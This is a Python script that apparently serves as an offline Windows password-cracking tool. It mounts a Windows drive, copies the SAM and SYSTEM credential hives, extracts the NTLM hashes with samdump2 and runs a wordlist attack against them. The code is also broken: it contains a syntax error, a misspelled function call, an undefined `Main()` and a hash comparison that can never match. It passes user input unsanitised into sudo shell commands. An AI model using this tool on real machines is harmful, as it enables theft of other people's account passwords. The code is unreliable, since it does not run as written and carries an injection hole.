import hashlib, binascii, os, subprocess

def mkdir():
    os.chdir("/mnt/")
    print("[+] Directory Changed To /mnt/")
    os.mkdir(input("Enter New Name For A Directory: "))
    print("[+] Created Directory")

def animal():
    guesses = 1
    cracked = False

    def converted_ntlm(password):
        ntlm_hash = binascii.hexlify(hashlib.new('md4', password.encode('utf-16le')).digest())

        return ntlm_hash

    def match_hashes(input, test):
        if input == test:
            return True

        else:
            return False

    os.chdir("/mnt/")
    directory = input("Confirm Name of Your Directory: ")
    print("..............................................") 
    subprocess.call("sudo fdisk -l")
    print("..............................................")
    windows_harddrive = input("Enter Path To Windows Hard Drive: ") 
    subprocess.call("sudo mount -o ro " + windows_harddrive + " " + directory, shell=True)
    subprocess.call("sudo cp /mnt/" + directory + "/Windows/System32/config/SAM .", shell=True)
    subprocess.call("sudo cp /mnt/" + directory + "/Windows/System32/config/SYSTEM .", shell=True)
    subprocess.call("sudo samdump2 SYSTEM SAM -o targethashes.txt", shell=True)
    subprocess.call("sudo rm -rf SYSTEM SAM", shell=True)
    subprocess.call("sudo nano targethashes.txt", shell=True)

    with open("targethashes.txt"), "r") as input_file:
        input_hash = input_file.readlines()

    with open(input("Enter Path to Your Password List: "), "r", errors="ignore") as password_list:
        
        for line in password_list:
            if cracked:
                break

            else:
                password_guess = line.rstrip()
                ntlm_hash = coverted_ntlm(password_guess)

                print(f"GUESSES: {guesses}", end="\r")

                if match_hashes(input_hash, ntlm_hash):
                    cracked = True

                guesses += 1

        if cracked:
            print(f"PASSWORD FOUND: {password_guess}")
            subprocess.call("sudo rm -f targethashes.txt", shell=True)
            
        else:
            print(f"NO PASSWORD FOUND OUT OF {guesses} GUESSES")
            subprocess.call("sudo rm -f targethashes.txt", shell=True)
            subprocess.call("sudo umount " + windows_harddrive, shell=True) 


def main():
    try:
        print("..............................................")
        print("                     MENU                     ")
        print("..............................................")
        print("EDIT IN NANO WHAT USER YOU WANT TO RUN THE ATTACK WHEN PROMPT SHOWS HASHES") 
        print("DELETE THE OTHER USER HASHES, SAVE AND THEN EXIT NANO")
        print("YOU NEED A EMPTY DIRECTORY IN /mnt/ TO CONTINUE")
        print("")
        choice = input("(Y) Make New Directory (N) Continue: ")
        if choice == "Y":
            mkdir()
            animal()
        elif choice == "N":
            animal()
        else:
            print("")
            print("INVALID INPUT EXITING")
            quit()

    except KeyboardInterrupt:
        print("")
        print("KEYBOARD INTERRUPTION EXITING")
        quit()
Main()
